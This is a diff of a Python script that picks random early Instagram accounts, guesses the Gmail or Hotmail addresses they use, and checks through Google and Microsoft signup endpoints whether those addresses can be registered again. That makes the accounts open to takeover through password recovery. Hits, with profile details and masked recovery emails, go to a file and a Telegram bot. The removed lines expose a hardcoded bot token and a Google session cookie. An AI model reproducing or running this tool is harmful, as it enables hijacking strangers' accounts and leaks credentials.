@@ -8,7 +8,6 @@ import sys
 from threading import Thread
 from user_agent import generate_user_agent
 import time as time_module
-from urllib.parse import quote
 
 class qredes:
     def __init__(self):
@@ -17,35 +16,29 @@ class qredes:
         self.bad_instgram = 0
         self.good_insgram = 0
         
-        # Hardcoded credentials
-        self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
-        self.id = '7746909110'
+        # Get token and ID from environment variables (for Render) or input
+        self.token = os.environ.get('TELEGRAM_TOKEN') or input('[+] Enter Token : ')
+        if not os.environ.get('TELEGRAM_TOKEN'):
+            os.system('clear' if os.name == 'posix' else 'cls')
         
-        # Test Telegram connection
-        print("Testing Telegram connection...")
-        test_msg = "🚀 Bot started on Render! Searching for Instagram accounts (2010-2013)"
-        self.send_telegram(test_msg)
-        print("Telegram test sent!")
-        time_module.sleep(2)
+        self.id = os.environ.get('TELEGRAM_CHAT_ID') or input('[+] Enter ID : ')
+        if not os.environ.get('TELEGRAM_CHAT_ID'):
+            os.system('clear' if os.name == 'posix' else 'cls')
         
-        # Initialize hotmail tokens
-        self.initialize_hotmail()
+        # Instagram user ID ranges for 2010-2012 era
+        # Instagram launched in October 2010
+        # 2010 (Oct-Dec): 1 - 1,000,000
+        # Early 2011: 1,000,000 - 10,000,000
+        # Late 2011: 10,000,000 - 50,000,000
+        # 2012: 50,000,000 - 150,000,000
+        self.MIN_USER_ID = 1
+        self.MAX_USER_ID = 150000000  # Covers 2010-2012
         
-        # Start threads
-        print("Starting worker threads...")
-        for i in range(100):
-            Thread(target=self.home, daemon=True).start()
+        print(f"[+] Targeting 2010-2012 era users (ID range: {self.MIN_USER_ID} - {self.MAX_USER_ID})")
+        print("[+] Ranges: 2010 (1-1M) | Early 2011 (1M-10M) | Late 2011 (10M-50M) | 2012 (50M-150M)")
         
-        print(f"✅ Started 100 worker threads")
-        
-        # Keep alive
+        # Initialize Hotmail tokens
         while True:
-            time_module.sleep(60)
-    
-    def initialize_hotmail(self):
-        retry_count = 0
-        max_retries = 5
-        while retry_count < max_retries:
             try:
                 headers = {
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -57,9 +50,7 @@ class qredes:
                 canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                 self.amsc = response.cookies.get_dict()['amsc']
                 
-                cookies = {
-                    'amsc': self.amsc,
-                }
+                cookies = {'amsc': self.amsc}
                 headers = {
                     'accept': 'application/json',
                     'accept-language': 'en-US,en;q=0.9',
@@ -70,15 +61,11 @@ class qredes:
                     'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                 }
                 json_data = {
-                    'clientExperiments': [
-                        {
-                            'parallax': 'enableplaintextforsignupexperiment',
-                            'control': 'enableplaintextforsignupexperiment_control',
-                            'treatments': [
-                                'enableplaintextforsignupexperiment_treatment',
-                            ],
-                        },
-                    ],
+                    'clientExperiments': [{
+                        'parallax': 'enableplaintextforsignupexperiment',
+                        'control': 'enableplaintextforsignupexperiment_control',
+                        'treatments': ['enableplaintextforsignupexperiment_treatment'],
+                    }],
                 }
                 response = requests.post(
                     'https://signup.live.com/API/EvaluateExperimentAssignments',
@@ -88,39 +75,56 @@ class qredes:
                     timeout=10
                 ).json()
                 self.canary = response['apiCanary']
-                print('[+] Hotmail tokens initialized successfully')
+                print("[+] Hotmail tokens initialized successfully")
                 break
             except Exception as e:
-                retry_count += 1
-                print(f'[!] Error getting hotmail tokens (attempt {retry_count}/{max_retries}): {str(e)}')
-                time_module.sleep(3)
-                if retry_count >= max_retries:
-                    print('[!] Failed to initialize hotmail tokens, continuing anyway...')
-                    self.amsc = None
-                    self.canary = None
-    
-    def send_telegram(self, message):
-        """Send message to Telegram with proper URL encoding"""
+                print(f'[!] Error getting hotmail tokens: {e}, retrying...')
+                time_module.sleep(2)
+        
+        os.system('clear' if os.name == 'posix' else 'cls')
+        
+        # Use fewer threads for Render (they have limited resources)
+        num_threads = int(os.environ.get('NUM_THREADS', '50'))
+        print(f"[+] Starting {num_threads} threads...")
+        
+        for _ in range(num_threads):
+            Thread(target=self.home, daemon=True).start()
+        
+        # Keep main thread alive for Render
+        try:
+            while True:
+                time_module.sleep(60)
+        except KeyboardInterrupt:
+            print("\n[!] Stopping...")
+            sys.exit(0)
+
+    def validate_recovery_email(self, username, recovery_email):
+        """Validate that recovery email matches username pattern"""
+        if not recovery_email or recovery_email == "None":
+            return False
+        
+        try:
+            # Extract the masked part (e.g., "m*******1" from "m*******1@aol.com")
+            masked_part = recovery_email.split('@')[0]
+            
+            # Get first and last character from masked email
+            first_char = masked_part[0].lower()
+            last_char = masked_part[-1].lower()
+            
+            # Get first and last character from username
+            username_first = username[0].lower()
+            username_last = username[-1].lower()
+            
+            # Check if they match
+            if first_char == username_first and last_char == username_last:
+                return True
+            return False
+        except:
+            return False
+
+    def insta1(self, email):
         max_retries = 3
         for attempt in range(max_retries):
-            try:
-                # URL encode the message
-                encoded_message = quote(message)
-                url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
-                response = requests.get(url, timeout=10)
-                if response.status_code == 200:
-                    print('[✓] Message sent to Telegram!')
-                    return True
-                else:
-                    print(f"Telegram error: {response.status_code}")
-            except Exception as e:
-                print(f"Telegram attempt {attempt + 1} failed: {e}")
-                if attempt < max_retries - 1:
-                    time_module.sleep(1)
-        return False
-    
-    def insta1(self, email):
-        while True:
             try:
                 csrftoken = md5(str(time()).encode()).hexdigest()
                 headers = {
@@ -132,21 +136,20 @@ class qredes:
                     'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
                     'x-csrftoken': csrftoken,
                 }
-
-                data = {
-                    'username': email,
-                }
-
+                data = {'username': email}
                 response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
                 if 'showAccountRecoveryModal' in response:
                     return True
                 else:
                     return False
             except:
-                return False
-    
+                if attempt == max_retries - 1:
+                    return False
+                time_module.sleep(1)
+
     def insta2(self, email):
-        while True:
+        max_retries = 3
+        for attempt in range(max_retries):
             try:
                 url = 'https://b.i.instagram.com/api/v1/accounts/login/'
                 headers = {
@@ -176,10 +179,13 @@ class qredes:
                 else:
                     return False
             except:
-                return False
+                if attempt == max_retries - 1:
+                    return False
+                time_module.sleep(1)
 
     def check_gmail(self, email):
-        while True:
+        max_retries = 3
+        for attempt in range(max_retries):
             try:
                 if '@' in email:
                     email = email.split('@')[0]
@@ -189,40 +195,14 @@ class qredes:
                     'accept': '*/*',
                     'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                     'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                    'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW;',
                     'origin': 'https://accounts.google.com',
                     'referer': 'https://accounts.google.com/',
-                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Linux"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
                     'user-agent': generate_user_agent(),
                     'x-same-domain': '1',
                 }
-                par = {
-                    'biz': 'false',
-                    'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
-                    'ddm': '0',
-                    'dsh': f'S-{tim}:1722139307145196',
-                    'flowEntry': 'SignUp',
-                    'flowName': 'GlifWebSignIn',
-                }
-                re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519', params=par, cookies=None, headers=headers, timeout=10)
-                try:
-                    tok = re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
-                except:
-                    pass
-                
-                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'
-                params = {
-                    'TL': tok,
-                }
+                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&'
                 re = requests.post(
                     'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-                    params=params,
-                    cookies=None,
                     headers=headers,
                     data=data,
                     timeout=10
@@ -232,33 +212,17 @@ class qredes:
                 else:
                     return False
             except Exception as e:
-                return False
-
-    def check_hotmail(self, email):
-        while True:
-            try:
-                cookies = {
-                    'amsc': self.amsc,
-                }
-                headers = {
-                    'accept': 'application/json',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'canary': self.canary,
-                    'content-type': 'application/json; charset=utf-8',
-                    'origin': 'https://signup.live.com',
-                    'referer': 'https://signup.live.com/',
-                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-                }
-                json_data = {
-                    'signInName': email,
-                }
-                response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
-                if '"isAvailable":true' in response:
-                    return True
-                else:
+                if attempt == max_retries - 1:
                     return False
-            except Exception as e:
-                return False
+                time_module.sleep(1)
+
+    def get_account_creation_date(self, user_id):
+        """Get account creation date from user ID"""
+        try:
+            response = requests.get(f'https://mel7n.pythonanywhere.com/?id={user_id}', timeout=5).json()
+            return response.get('date', 'Unknown')
+        except:
+            return 'Unknown'
 
     def get_info(self, username, domen):
         try:
@@ -281,10 +245,9 @@ class qredes:
                 'Host': 'i.instagram.com',
                 'X-FB-HTTP-Engine': 'Liger',
                 'Connection': 'keep-alive',
-                'Content-Length': '356',
             }
             data = {
-                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
+                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{username}"}}',
                 'ig_sig_key_version': '4',
             }
             try:
@@ -292,18 +255,22 @@ class qredes:
                 rest = response.json()['email']
             except:
                 rest = None
+
+            # Validate recovery email matches username FIRST
+            if not self.validate_recovery_email(username, rest):
+                return False  # Not a valid hit, skip
+
+            # Get profile info
             headers = {
                 'accept': '*/*',
                 'accept-language': 'en',
-                'referer': 'https://www.instagram.com/{}/'.format(username),
+                'referer': f'https://www.instagram.com/{username}/',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
                 'x-ig-app-id': '936619743392459',
                 'x-ig-www-claim': '0',
                 'x-requested-with': 'XMLHttpRequest',
             }
-            params = {
-                'username': username,
-            }
+            params = {'username': username}
             try:
                 response = requests.get(
                     'https://www.instagram.com/api/v1/users/web_profile_info/',
@@ -313,6 +280,8 @@ class qredes:
                 ).json()
             except:
                 response = None
+
+            # Extract user info
             try:
                 id = response['data']['user']['id']
             except:
@@ -341,180 +310,182 @@ class qredes:
                 biography = response['data']['user']['biography']
             except:
                 biography = None
-            try:
-                if id == None:
-                    date = None
-                else:
-                    try:
-                        date = requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id), timeout=5).json()['date']
-                    except:
-                        date = None
-            except:
-                date = None
-            info = '''
+            
+            # Get account creation date
+            if id:
+                date = self.get_account_creation_date(id)
+            else:
+                date = 'Unknown'
 
-  ⌯ Hi Arman Got Hit
-  ᯓᯓᯓᯓᯓᯓᯓᯓ
-  folowers : {}
-  following : {}
-  total posts : {}
-  isPraise : {}
-  username : {}
-  email : {}@{}
-  date : {}
-  id : {}
-  full name : {}
-  bio : {}
-  rest : {}
-  ᯓᯓᯓᯓᯓᯓᯓᯓ
-  by : @armann_olds
-        '''.format(followerNum, followingNum, postNum, isPraise, username, username, domen, date, id, full_name, biography, rest)
-            print(info)
-            with open(f'hits.txt', 'a') as f:
-                f.write(info + '\n')
-        except:
-            info = '''
+            # Format the message with new template
+            info = f'''═══════════════════════════
+🎯 HIT FOUND by Arman! 🎯
+═══════════════════════════
+📧 Email: {username}@{domen}
+👤 Username: {username}
+👥 Followers: {followerNum if followerNum else 'None'}
+👣 Following: {followingNum if followingNum else 'None'}
+📸 Posts: {postNum if postNum else 'None'}
+🔒 Private: {isPraise if isPraise else 'None'}
+🔗 Link: https://instagram.com/{username}
+📅 Created: {date}
+🆔 ID: {id if id else 'None'}
+📝 Name: {full_name if full_name else 'None'}
+💬 Bio: {biography if biography else 'None'}
+📩 Recovery: {rest if rest else 'None'}
+═══════════════════════════
+by: @m0hsvn'''
 
-          ⌯ Hi Arman Got Hit
-          ᯓᯓᯓᯓᯓᯓᯓᯓ
-          folowers : {}
-          following : {}
-          total posts : {}
-          isPraise : {}
-          username : {}
-          email : {}@{}
-          date : {}
-          id : {}
-          full name : {}
-          bio : {}
-          rest : {}
-          ᯓᯓᯓᯓᯓᯓᯓᯓ
-          by : @Armannn_olds
-                '''.format(None, None, None, None, username, username, domen, None, None, None, None, None)
             print(info)
-            with open(f'hits.txt', 'a') as f:
-                f.write(info + '\n')
-        
-        # Send to Telegram
-        while True:
+            
+            # Save to file
             try:
-                self.send_telegram(info)
-                return
+                with open('hits.txt', 'a', encoding='utf-8') as f:
+                    f.write(info + '\n\n')
             except:
                 pass
 
-    def get_username(self):
-        while True:
+            # Send to Telegram
+            max_retries = 5
+            for attempt in range(max_retries):
+                try:
+                    response = requests.get(
+                        f'https://api.telegram.org/bot{self.token}/sendMessage',
+                        params={'chat_id': self.id, 'text': info},
+                        timeout=10
+                    )
+                    if response.status_code == 200:
+                        return True
+                    else:
+                        time_module.sleep(2)
+                except Exception as e:
+                    if attempt == max_retries - 1:
+                        print(f"\n[!] Telegram send error: {e}")
+                    time_module.sleep(2)
+            
+            return True
+
+        except Exception as e:
+            return False
+
+    def check_hotmail(self, email):
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                cookies = {'amsc': self.amsc}
+                headers = {
+                    'accept': 'application/json',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'canary': self.canary,
+                    'content-type': 'application/json; charset=utf-8',
+                    'origin': 'https://signup.live.com',
+                    'referer': 'https://signup.live.com/',
+                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+                }
+                json_data = {'signInName': email}
+                response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
+                if '"isAvailable":true' in response:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                if attempt == max_retries - 1:
+                    return False
+                time_module.sleep(1)
+
+    def get_username_from_id(self, user_id):
+        """Get username from Instagram user ID (2011-2012 range)"""
+        max_retries = 3
+        for attempt in range(max_retries):
             try:
                 headers = {
                     'accept': '*/*',
                     'accept-language': 'en-US,en;q=0.9',
                     'content-type': 'application/x-www-form-urlencoded',
                     'origin': 'https://www.instagram.com',
-                    'priority': 'u=1, i',
-                    'sec-ch-prefers-color-scheme': 'dark',
-                    'sec-ch-ua': '"Opera";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
-                    'sec-ch-ua-full-version-list': '"Opera";v="111.0.5168.61", "Chromium";v="125.0.6422.143", "Not.A/Brand";v="24.0.0.0"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-model': '""',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-ch-ua-platform-version': '"10.0.0"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
-                    'x-asbd-id': '129477',
-                    'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
                     'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
                     'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
-                    'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
                     'x-ig-app-id': '936619743392459',
-                    'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
                 }
                 data = {
-                    'av': '17841408545457742',
-                    '__user': '0',
-                    '__a': '1',
-                    '__req': '53',
-                    '__hs': '19920.HYP:instagram_web_pkg.2.1..0.1',
-                    'dpr': '1',
-                    '__ccg': 'UNKNOWN',
-                    '__rev': '1014910249',
-                    '__s': 'lgqvll:0onelj:i7g1ua',
-                    '__hsi': '7392194034338563714',
-                    '__dyn': '7xeUjG1mxu1syaxG4Vp41twpUnwgU7SbzEdF8vyUco2qwJyEiw9-1DwUx60p-0LVE4W0om78c87m0yE462mcw5Mx62G5UswoEcE7O2l0Fwqo31w9O1TwQzXw8W58jwGzEaE2iwNwKxm5o2eUlwhEe88o5i7U1bobpEbUGdwtUd-2u2J08O321LwTwKG1pg2fwxyo6O1FwlEcUed6goK2OubK5V89FbxG6Uf9EO6UaU',
-                    '__csr': 'iMkMF5NsIh2I4Aggpik9SLfZgxAZOsJh6DcNcUFXH-GHqnlaoSiypHBiVaFkhtdFmO-AjjKW8DS8UVrnJ3vihVXAiHApWyu8CWACiKWQArCWl24rBWaJaHGSbyHl5Dz8yprKaKGGmjy9EhKUy8BACKmmuXWyryp-8Bgqw059QwmGw9y5e0aLypngsDPG4k5d0oU7T-swvg14U2Nxpa4kqdiul0l9m0ieq1OwSggwlE36w3ePGeG092xq2K250k8louxClkUPowHDmok6U26xm0Qkao4FhKEJK5riP0loV0cS0tu13wwx1G4kyKsa1Kcxqm2aE6C0BsMy1PxiohDk8wd_h8146148A9Cg6mWm0H944ye4QfAwbiaU5eUhERkq2y1Twjo96E9Hp9UiQcg1EQ2Smlo7eUG6oB7w0ovEbu3q0d8w7vw2a8dS1ywBQ0tN0',
-                    '__comet_req': '7',
-                    'fb_dtsg': 'NAcN9-rfGhppacO0TiJS1KOuTzGJmIJqDEX_mLq8xVMayYEUgtoQyxQ:17853599968089360:1719656032',
-                    'jazoest': '26445',
-                    'lsd': '3TdmFoJ7r2hQowntSy6Exd',
-                    '__spin_r': '1014910249',
-                    '__spin_b': 'trunk',
-                    '__spin_t': '1721129295',
-                    'fb_api_caller_class': 'RelayModern',
-                    'fb_api_req_friendly_name': 'PolarisProfilePageContentDirectQuery',
-                    'variables': '{"id":"' + str(randrange(1, 300000000)) + '","render_surface":"PROFILE"}',
-                    'server_timestamps': 'true',
+                    'variables': '{"id":"' + str(user_id) + '","render_surface":"PROFILE"}',
                     'doc_id': '7663723823674585',
                 }
-                username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data, timeout=10).json()['data']['user']['username']
-                return [username]
+                response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=10).json()
+                username = response['data']['user']['username']
+                return [username] if username else None
             except Exception as e:
-                pass
+                if attempt == max_retries - 1:
+                    return None
+                time_module.sleep(1)
 
     def home(self):
         while True:
             try:
-                sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')
+                sys.stdout.write(f'\rHits: {self.hits} | Bad Instagram: {self.bad_instgram} | Bad Email: {self.bad_email} | Good Instagram: {self.good_insgram}\r')
+                sys.stdout.flush()
 
-                while True:
-                    try:
-                        usernames = self.get_username()
-                        if usernames == None:
-                            pass
-                        else:
-                            break
-                    except:
-                        pass
+                # Get username from 2011-2012 era user ID range
+                user_id = randrange(self.MIN_USER_ID, self.MAX_USER_ID)
+                usernames = self.get_username_from_id(user_id)
+                
+                if usernames is None:
+                    continue
+
                 for username in usernames:
-                    sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')
+                    sys.stdout.write(f'\rHits: {self.hits} | Bad Instagram: {self.bad_instgram} | Bad Email: {self.bad_email} | Good Instagram: {self.good_insgram}\r')
+                    sys.stdout.flush()
+                    
                     api1 = choice('122')
                     api2 = choice('122')
                     email1 = username + '@gmail.com'
                     email2 = username + '@hotmail.com'
-                    if '1' == api1:
+                    
+                    # Check Gmail
+                    if api1 == '1':
                         s11 = self.insta1(email1)
-                    elif '2' == api1:
+                    elif api1 == '2':
                         s11 = self.insta2(email1)
-                    if '1' == api2:
-                        s22 = self.insta1(email2)
-                    elif '2' == api2:
-                        s22 = self.insta2(email2)
+                    else:
+                        s11 = False
+                    
                     if s11 == True:
                         self.good_insgram += 1
                         qq = self.check_gmail(email1)
                         if qq == True:
-                            self.hits += 1
-                            username, domen = email1.split('@')
-                            self.get_info(username, domen)
+                            username_part, domen = email1.split('@')
+                            result = self.get_info(username_part, domen)
+                            if result == True:
+                                self.hits += 1
                         else:
                             self.bad_email += 1
                     else:
                         self.bad_instgram += 1
+                    
+                    # Check Hotmail
+                    if api2 == '1':
+                        s22 = self.insta1(email2)
+                    elif api2 == '2':
+                        s22 = self.insta2(email2)
+                    else:
+                        s22 = False
+                    
                     if s22 == True:
                         self.good_insgram += 1
                         qq = self.check_hotmail(email2)
                         if qq == True:
-                            self.hits += 1
-                            username, domen = email2.split('@')
-                            self.get_info(username, domen)
+                            username_part, domen = email2.split('@')
+                            result = self.get_info(username_part, domen)
+                            if result == True:
+                                self.hits += 1
                         else:
                             self.bad_email += 1
                     else:
                         self.bad_instgram += 1
+                        
             except Exception as e:
-                pass
-
+                time_module.sleep(1)
 
 if __name__ == '__main__':
     qredes()
